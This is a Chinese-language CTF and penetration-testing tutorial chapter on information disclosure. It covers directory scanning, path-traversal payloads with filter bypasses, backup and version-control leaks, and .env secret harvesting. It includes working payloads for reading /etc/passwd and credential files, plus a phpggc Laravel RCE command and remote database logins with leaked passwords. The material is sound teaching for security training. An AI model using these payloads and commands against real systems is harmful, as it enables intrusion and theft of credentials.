# 1. 信息泄露

信息泄露是渗透测试的第一步——从目录扫描、备份文件、版本控制泄露中找到源码、配置和密钥，为后续攻击铺路。

## 1.1 常见敏感目录

很多网站在部署时会遗留下不该公开访问的目录或文件——比如管理员忘了删掉测试页面、版本控制目录被打包上传、配置文件被放在 web 目录下。

**核心思路：** 用工具对目标网站批量请求一个常见目录字典，再结合状态码、响应长度、响应体和重定向目标判断路径是否值得继续分析。`403` 可能来自真实权限控制，也可能来自 WAF 或统一拦截；`301/302` 只说明发生了跳转；自定义路由和 Soft 404 也可能让不存在的路径不返回标准 `404`。

**手动探测的优先级：**

不需要上来就扫全量字典，先手动试几个高价值路径，往往一击即中：

```
/robots.txt          # 爬虫协议，直接告诉你哪些目录不想被搜到（恰好说明那里有东西）
/.git/HEAD           # Git 仓库泄露（详见 3.4 节）
/.svn/entries        # SVN 仓库泄露
/.env                # Laravel/PHP 环境变量，可能含数据库密码和密钥
/phpinfo.php         # PHP 信息页，泄露服务器路径和配置
/console             # Werkzeug 调试控制台（Flask debug 模式）
/actuator            # Spring Boot 监控端点，可能泄露路由和配置
/admin               # 管理后台入口
/backup              # 备份目录
/phpmyadmin          # 数据库管理工具
/www.zip             # 整站源码打包
/www.tar.gz          # 同上
/source.zip          # 源码压缩包
```

**目录扫描工具：**

手工试完高价值路径后，再用工具跑字典做全面扫描。常用工具和基本用法：

```bash
# dirsearch（最常用，带颜色输出）
python dirsearch.py -u http://target.com -e php,html,txt,zip,bak

# gobuster（Go 写的，速度快）
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# dirb（老牌工具，Kali 自带）
dirb http://target.com

# ffuf（性能最强，适合大字典）
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

**扫描结果判断技巧：**

- `200` → 路径存在且可访问，直接浏览器打开看内容
- `403 Forbidden` → 可能是路径权限、WAF 或统一拦截，先与随机不存在路径的响应做对照
- `301/302` → 发生重定向，跟到 `Location` 目标并检查跳转前响应；不一定代表需要认证
- `404` → 通常表示未找到，但仍要排除自定义 404、Soft 404 和按路由统一返回的情况
- **注意扫描时的响应长度**：同一套框架的 404 页面长度通常一致，如果某个 `200` 的长度与众不同，大概率有东西
- **注意响应时间**：如果某个路径比其他路径返回明显更慢，可能是进入了耗时操作（数据库查询等），值得进一步分析

## 1.2 目录穿越

目录穿越（Path Traversal）的原理很简单：网站通过参数接收一个文件路径，然后读取文件内容显示出来。如果后端没有对 `../` 做过滤，你就可以跳出网站目录，读到服务器上的任意文件。

**漏洞是怎么产生的：**

```php
// 后端典型写法（有漏洞）
$file = $_GET['file'];
include("/var/www/html/" . $file);
```

开发者本意是让你访问 `?file=about.php` → 服务器读 `/var/www/html/about.php`。但如果你传 `?file=../../../etc/passwd`，实际路径就拼接成了 `/var/www/html/../../../etc/passwd` → 等价于 `/etc/passwd`。

**一眼找到漏洞点：**

URL 里看到这类参数就要立刻警觉：

```
?file=xxx      ?path=xxx     ?page=xxx     ?template=xxx    ?load=xxx
?include=xxx   ?dir=xxx      ?folder=xxx   ?document=xxx    ?read=xxx
```

同理 POST 请求体或 Cookie 值里出现文件名也值得尝试。

**基础 Payload：**

```
# Linux 目标
../../../etc/passwd
../../../../../../etc/passwd    # 一般会多写几层，确保回到根目录

# Windows 目标
..\..\..\windows\win.ini
../../../../windows/win.ini      # Windows 也认 /
```

**常见过滤绕过技巧：**

```bash
# 1. URL 编码（后端只拦 ../ 原文）
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%2f..%2f..%2fetc/passwd

# 2. 二次 URL 编码（后端解码一次后过滤，再解码一次才拼路径）
%252e%252e%252fetc/passwd

# 3. 双写绕过（后端把 ../ 替换为空，但只替换一次）
....//....//....//etc/passwd
..././..././..././etc/passwd

# 4. 绝对路径（后端只是在前面拼接路径，直接给 / 开头就绕过了）
/etc/passwd
```

**CTF 中值得读的目标文件：**

| 文件 | 价值 |
|---|---|
| `/etc/passwd` | 验证漏洞存在，列出系统用户 |
| `/proc/self/environ` | 环境变量，可能含密钥 |
| `/proc/self/cmdline` | 当前进程的启动命令 |
| `/proc/1/cgroup` | 判断是否在容器里 |
| `/flag` | CTF 最常见 flag 位置 |
| `WEB-INF/web.xml` | Java Web 应用配置，泄露路由和数据库信息 |
| `.htaccess` | Apache 目录配置 |
| `config.php`   `database.php` | PHP 数据库配置 |
| `app.py`   `app.config` | Python/Flask 源码或配置 |
| `C:\Windows\System32\drivers\etc\hosts` | Windows hosts 文件 |

**怎么判断是否存在漏洞：**

通常用 `?file=../../../etc/passwd` 测试，如果返回内容里出现 `root:x:0:0:` 就说明路径穿越通了。如果被过滤再按上面的绕过方式逐个尝试。即使没读到目标文件，报错信息里暴露了服务器真实路径，也算有效信息。

## 1.3 备份文件常见后缀

开发者修改代码前通常会先复制一份作为备份（如 `index.php` → `index.php.bak`），或使用编辑器远程修改文件时产生交换文件（如 Vim 的 `.swp`、Emacs 的 `~` 后缀）。如果这些文件没有被清理，并在部署上线时一并被打包上传到了服务器，攻击者直接访问即可下载到源码。

**常见备份后缀：**

知道目标文件名后（比如 `index.php`），挨个试后缀：

```
index.php.bak
index.php.old
index.php.backup
index.php.bk
index.php.swp        # Vim 编辑时产生的交换文件，恢复命令 vim -r
index.php.swo        # Vim 另一个交换文件
index.php~           # 某些编辑器备份（末尾加波浪号）
index.php.save
index.php.orig
index.php.txt        # 有的编辑器另存为文本
.#index.php          # Emacs 自动保存的锁文件
```

**整站源码包：**

开发者打包整个网站做备份，然后忘了删。常见文件名：

```
www.zip       www.tar.gz      www.rar       www.7z
web.zip       web.tar.gz      web.rar
backup.zip    backup.tar.gz   backup.rar
site.zip      site.tar.gz
source.zip    source.tar.gz
code.zip      code.tar.gz
wwwroot.zip   wwwroot.tar.gz
1.zip         1.rar           # 顺手打包的名字
```

**数据库 dump 文件：**

```
db.sql        database.sql    backup.sql
dump.sql      data.sql        export.sql
db.sql.gz     database.sql.gz
```

**扫描方法：**

用扫描工具，带 `-e` 参数指定后缀：

```bash
# dirsearch 扫备份后缀
python dirsearch.py -u http://target.com -e bak,old,backup,swp,txt,zip,tar.gz,rar,sql,~

# gobuster
gobuster dir -u http://target.com -x bak,old,backup,zip,tar.gz,sql -w wordlist.txt
```

如果已经知道目标文件名，手动在浏览器拼后缀比扫描工具更快——CTF 里经常 `index.php.bak` 一下就直接拿到源码。

## 1.4 DVCS 泄露

开发者在部署代码时，把整个项目目录（包含 `.git`、`.svn` 等版本控制目录）一并上传到了服务器。这些目录里有完整的代码历史记录，攻击者访问到就能还原出全部源码。

**1. `.git` 泄露（最常见）**

先确认是否存在：浏览器访问 `http://target.com/.git/HEAD`，如果返回 `ref: refs/heads/master` 就说明 `.git` 目录可访问。

手工还原很繁琐，直接用工具拉取：

```bash
# GitHack（Python 脚本，最常用）
python GitHack.py http://target.com/.git/

# git-dumper（更稳定，直接重建 git 仓库）
./git-dumper http://target.com/.git/ output_dir/

# GitTools 三件套（gitdumper.sh 拉取 + git_extractor.sh 提取 + git_find.sh 搜索）
bash gitdumper.sh http://target.com/.git/ output_dir
```

拉下来后 `git log` 看提交历史，`git diff` 看每次改了什么，flag 可能藏在某次提交的改动里。

**特殊情况处理：**

- 目录列不出来但文件能访问 → 工具一般能自动处理，逐个请求已知文件名拉取
- `.git/index` 不可读 → 尝试用 GitHack 的 `--index` 参数或 git-dumper，会走另一种方式重建
- 只有 `.git/objects/` 可读 → 用 `git cat-file` 挨个解析 object 文件还原内容

**2. `.svn` 泄露**

Subversion（SVN）是集中式版本控制系统，会在项目每个目录下生成一个 `.svn` 隐藏文件夹。

常见泄露文件：

```
/.svn/entries          # SVN 1.6 及之前版本，记录目录结构和文件列表
/.svn/wc.db            # SVN 1.7+ 用 SQLite 数据库存储所有信息
/.svn/pristine/        # SVN 1.7+ 按校验和路径保存文件原始内容，并非 base64 编码
/.svn/text-base/       # 源代码文件的原始副本
```

利用方法：

```bash
# dvcs-ripper（一键拉取，支持 git/svn/hg/bzr）
perl rip-svn.pl -v -u http://target/.svn/

# svn-extractor（Python 工具，效果类似）
python svn_extractor.py http://target/
```

如果工具拉不全，可以手动下载 `.svn/wc.db` 后查询：

```bash
sqlite3 wc.db "SELECT * FROM NODES;"
```

**3. `.hg` 泄露**

Mercurial（hg）是分布式版本控制系统，会在项目根目录下生成 `.hg` 隐藏文件夹。

常见泄露文件：

```
/.hg/requires          # 仓库配置要求，访问它确认泄露存在
/.hg/dirstate          # 工作目录状态，记录文件和节点 ID
/.hg/store/            # 存储所有版本的历史数据
/.hg/branch            # 当前分支名
```

利用方法：

```bash
# dvcs-ripper（一键拉取）
perl rip-hg.pl -v -u http://target/.hg/

# hg-extractor（Python 脚本）
python hg_extractor.py http://target/.hg/
```

普通静态文件泄露并不等于服务器提供 Mercurial HTTP 仓库协议，所以通常不能直接对 `/.hg/` 执行 `hg clone`。应先用泄露恢复工具下载完整 `.hg` 元数据，再在本地工作副本中运行 `hg` 命令；只有目标确实配置了 Mercurial HTTP 服务时，远程 `hg clone` 才成立：

```bash
hg clone http://target/repository repo_copy
```

**通用检查步骤：**

1. 先访问 `/.git/HEAD`、`/.svn/entries`、`/.hg/requires` 确认是否存在
2. 确认存在后用对应工具拉取，一般跑完就能拿到完整源码
3. 拿不到再分析是不是目录权限不完整（比如只能读 objects 不能读 index），针对性处理

## 1.5 Vim 泄露

Vim 在编辑文件时会自动创建一个交换文件（swap file），用于崩溃恢复和防止多实例冲突。如果编辑器异常退出（SSH 断开、终端崩溃），这个交换文件就会残留在目录里。文件名为 `.原文件名.swp`，前面带点号所以 `ls` 默认看不到，但 web 服务器通常不拦截这类文件。

命名规则：

```
index.php        → .index.php.swp      # 第一个 Vim 实例
index.php        → .index.php.swo      # 第二个 Vim 实例
index.php        → .index.php.swn      # 第三个（依次类推：swm、swl……）
```

**利用方式：**

1. 在目标 URL 后拼交换文件名，浏览器访问下载：`http://target/.index.php.swp`
2. 下载后在本地用 Vim 恢复：`vim -r .index.php.swp`，即可看到编辑时的文件内容
3. 没有 Vim 也可以用 `strings .index.php.swp` 直接提取可读文本，大部分代码都能还原出来

## 1.6 macOS `.DS_Store` 泄露

`.DS_Store`（Desktop Services Store）是 macOS 系统在每个文件夹里自动生成的隐藏文件，用来保存文件夹的显示设置（图标位置、排序方式等）。虽然是二进制格式，但里面记录了该目录下**所有文件和子目录的名称**。如果开发者在 macOS 上创建了项目，部署时把这个文件一并上传到了服务器，攻击者下载后就能拿到完整的目录结构。

**利用方式：**

1. 访问 `http://target/.DS_Store`，浏览器下载该文件
2. 用 Python 的 `ds_store` 库解析：

```bash
pip install ds_store
python -c "import ds_store; ds=ds_store.DSStore.open('.DS_Store'); [print(f) for f in ds]"
```

3. 或者直接用 `strings .DS_Store | head -50`，大部分文件名会直接以明文形式出现，不需要解析工具

拿到文件名列表后，再逐个尝试访问其中非公开的路径。

## 1.7 .env 泄露

`.env` 文件是现代 Web 开发中最常见的环境变量配置文件。很多框架（Laravel、Symfony、ThinkPHP、Next.js 等）都使用 `.env` 来存放数据库密码、密钥、API Token 等敏感配置。

理论上 `.env` 应该放在网站根目录之外，或者由 Web 服务器拦截对 `.env` 的访问。但实际部署时经常出现以下情况：

- 开发者把整个项目目录拷贝到 `/var/www/html`，忘了 `.env` 也在里面
- Nginx/Apache 没有配置拦截隐藏文件（`.*` 开头的文件）
- Docker 容器里直接 `COPY . /app`，所有文件都暴露在 Web 目录下
- 服务器只配置了解析 `.php`，对没有后缀或 `.env` 后缀的文件直接返回原始内容

**怎么判断是否存在 .env 泄露：**

直接访问：

```text
http://target.com/.env
```

如果返回内容里出现 `DB_PASSWORD=`、`APP_KEY=`、`REDIS_PASSWORD=` 之类的键值对，说明 `.env` 可以被直接下载。

如果 `.env` 被拦截或 403，还可以尝试常见变体：

```text
/.env
/.env.local
/.env.production
/.env.backup
/.env.bak
/.env.dev
/.env.example          # 框架自带示例，通常不含真实密码，但能确认框架类型
/.env.old
/.env.save
/.env~
/.env.swp
/env
/env.txt
/app.env
/config/.env
/laravel/.env
/backend/.env
/api/.env
```

**拿到 .env 后重点看什么：**

| 键名 | 含义 |
|------|------|
| `APP_KEY` | Laravel 应用密钥，可用来伪造 Cookie/Session、解密加密数据 |
| `DB_PASSWORD`、`DB_USERNAME`、`DB_HOST` | 数据库连接信息，可能允许远程连接 |
| `REDIS_PASSWORD` | Redis 密码，配合 SSRF 可能写 Webshell |
| `JWT_SECRET`、`JWT_KEY` | JWT 签名密钥，可伪造任意用户 Token |
| `SECRET_KEY`、`SECRET` | 通用密钥，常出现在 Flask/Django 中 |
| `MAIL_PASSWORD`、`MAIL_USERNAME` | 邮件账号密码 |
| `AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY` | 云服务凭证 |
| `API_KEY`、`API_TOKEN` | 第三方 API 密钥 |
| `ENCRYPTION_KEY` | 加密密钥 |
| `ADMIN_PASSWORD` | 管理员密码（少数开发者会直接写在环境变量里） |

**拿到 APP_KEY 后的利用（以 Laravel 为例）：**

Laravel 的 `APP_KEY` 用于加密 Cookie 和 Session。有了 `APP_KEY`，就可以：

1. 解密目标发来的 Cookie，读取其中的 Session 数据
2. 伪造任意 Cookie，包括管理员身份的 Session
3. 如果应用使用了 Laravel 的加密功能（`encrypt()` / `decrypt()`），可以解密数据库中存储的加密字段

常用工具：

```bash
# 安装 phpggc（Laravel 反序列化 + APP_KEY 利用）
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 用 APP_KEY 生成 Laravel 反序列化 payload Cookie
php -d'phar.readonly=0' phpggc Laravel/RCE1 system 'cat /flag' -b app_key_value_here
```

**拿到数据库密码后的利用：**

如果 `.env` 泄露了数据库密码，且目标数据库端口（3306/5432/27017/6379）对外开放，可以直接远程连接：

```bash
# MySQL
mysql -h target.com -u root -p'password_from_env' -e "SHOW DATABASES;"

# Redis
redis-cli -h target.com -a password_from_env KEYS '*'
```

即使数据库端口不对外开放，拿到了数据库密码也能结合应用中可能存在的 SQL 注入漏洞，或者登录应用的数据库管理后台（如 phpMyAdmin、Adminer）。

**常见框架的 .env 路径惯例：**

| 框架 / 语言 | 配置文件位置 |
|-------------|-------------|
| Laravel (PHP) | `/.env` |
| Symfony (PHP) | `/.env`、`/.env.local` |
| ThinkPHP (PHP) | `/.env` |
| Flask (Python) | `/.env`、`/.flaskenv` |
| Django (Python) | `/.env`（配合 django-environ） |
| Express (Node.js) | `/.env`（配合 dotenv 包） |
| Next.js (Node.js) | `/.env`、`/.env.local`、`/.env.production` |
| Spring Boot (Java) | `/application.properties`、`/application.yml`（不是 .env，但作用相同） |

**注意：** Spring Boot 虽然不用 `.env`，但 `/actuator/env` 端点如果暴露，同样会泄露所有环境变量，连 `.env` 都不用读。

**CTF 中的常见套路：**

1. 目录扫描发现 `/.env` 返回 200 → 下载拿到 `DB_PASSWORD` → 远程连数据库 → 读 flag
2. 找到 `APP_KEY` → 解密 Cookie 发现是普通用户 → 用密钥伪造 admin Cookie → 登录拿 flag
3. `.env` 里 `JWT_SECRET=secret123` → 构造 JWT `alg:HS256` + `role:admin` → 签名通过 → 拿 flag
4. `.env` 里 `REDIS_PASSWORD=xxx` + SSRF → Gopher 协议写 crontab/WerbShell → RCE

## 1.8 二进制文件查看技巧

CTF 中下载到的源码包、数据库文件、临时文件往往不是纯文本格式，不能直接用编辑器打开。需要掌握几个快速提取信息的方法。

**1. `strings` —— 提取可读文本（最常用）**

任何二进制文件里埋藏的字符串都能被 `strings` 拉出来，是 CTF 里面对未知文件的第一个动作：

```bash
strings 文件名 | head -100          # 看前 100 行
strings 文件名 | grep -i flag       # 直接搜 flag
strings -n 8 文件名                  # 只显示长度 ≥8 的字符串（过滤短噪音）
```

**2. `file` —— 识别文件类型**

下载了一个没有后缀的文件，先用 `file` 判断它到底是什么：

```bash
file 未知文件
# 输出示例：SQLite 3.x database / Zip archive data / ELF 64-bit executable
```

**3. `xxd` / `hexdump` —— 查看十六进制原始数据**

`file` 是自动识别——你把文件丢给它，它告诉你类型。但 `file` 依赖文件头和内置特征库，遇到没见过的格式、文件头被故意修改过、或者文件不完整时，`file` 可能误判或直接报 `data`。`xxd` 则是你自己盯着原始字节看，不被任何特征库误导。左边十六进制数值，右边对应的 ASCII 字符。比如看到开头字节是 `50 4B 03 04`（右侧显示 `PK`），就知道是 zip 格式，改后缀 `.zip` 解压。同理 `1F 8B 08` 是 gzip，`89 50 4E 47` 是 PNG：

```bash
xxd 文件名 | head -50               # 十六进制 + ASCII 对照
hexdump -C 文件名 | head -50        # 同上，另一种风格
```

**4. `binwalk` —— 识别嵌套文件**

有些文件是"套娃"结构（比如固件里塞了压缩包，图片里藏了 zip），用 binwalk 自动发现：

```bash
binwalk 文件名                      # 列出文件中嵌入了什么
binwalk -e 文件名                   # 自动提取嵌套的文件
```

**典型 CTF 场景：** 下载了一个 `backup.bak`，`file` 看是 SQLite → `strings` 直接搜 `flag` → 或者 `sqlite3 backup.bak ".dump"` 导出全部数据。
